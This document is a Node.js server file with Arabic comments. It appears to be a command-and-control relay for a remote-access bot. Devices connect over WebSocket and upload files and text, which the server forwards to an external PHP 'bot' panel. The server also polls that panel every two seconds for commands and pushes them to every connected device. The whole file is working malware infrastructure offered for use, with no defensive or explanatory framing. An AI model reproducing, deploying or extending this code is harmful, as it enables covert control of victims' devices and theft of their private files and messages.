const express = require('express');
const webSocket = require('ws');
const http = require('http');
const axios = require("axios");
const multer = require('multer');
const FormData = require('form-data');

const PANEL_URL = 'https://wahm.pro/bot/control.php'; 

const app = express();
const appServer = http.createServer(app);
const appSocket = new webSocket.Server({ server: appServer });
const upload = multer({ storage: multer.memoryStorage() });

app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));

async function forwardToPanel(data, isFile = false) {
    try {
        if (isFile) {
            const form = new FormData();
            form.append('file', data.buffer, { filename: data.name });
            form.append('model', data.model);
            await axios.post(PANEL_URL, form, { headers: { ...form.getHeaders() } });
        } else {
            const params = new URLSearchParams();
            params.append('model', data.model);
            params.append('text', data.text);
            await axios.post(PANEL_URL, params);
        }
        console.log("✅ Forwarded to Panel");
    } catch (e) { console.log("❌ Panel Error: " + e.message); }
}

app.post("/uploadFile", upload.single('file'), async (req, res) => {
    if (req.file) await forwardToPanel({ buffer: req.file.buffer, name: req.file.originalname, model: req.headers.model }, true);
    res.send('OK');
});

app.post("/uploadText", async (req, res) => {
    if (req.body.text) await forwardToPanel({ model: req.headers.model, text: req.body.text });
    res.send('OK');
});

// إدارة الـ WebSocket مع تحسين الـ Ping/Pong
appSocket.on('connection', (ws, req) => {
    ws.model = req.headers.model || "Unknown";
    ws.isAlive = true;
    console.log(`📱 Connected: ${ws.model}`);

    ws.on('pong', () => { ws.isAlive = true; });
    ws.on('message', (msg) => console.log(`Message from ${ws.model}: ${msg}`));
});

// سحب الأوامر من PHP وإرسالها للأجهزة
setInterval(async () => {
    try {
        const res = await axios.get(`${PANEL_URL}?get_cmd=1`, { timeout: 2000 });
        const cmd = res.data.trim();
        
        if (cmd !== "WAIT" && cmd !== "OK" && cmd !== "") {
            console.log(`🚀 Executing Command: ${cmd}`);
            appSocket.clients.forEach(ws => {
                if (ws.readyState === webSocket.OPEN) {
                    ws.send(cmd);
                }
            });
        }
    } catch (e) { console.log("Polling error"); }
}, 2000); // تقليل الوقت لـ 2 ثانية لسرعة التنفيذ

// Ping للأجهزة كل 10 ثواني لضمان بقاء الاتصال
setInterval(() => {
    appSocket.clients.forEach(ws => {
        if (!ws.isAlive) return ws.terminate();
        ws.isAlive = false;
        ws.ping();
    });
}, 10000);

appServer.listen(process.env.PORT || 8999);

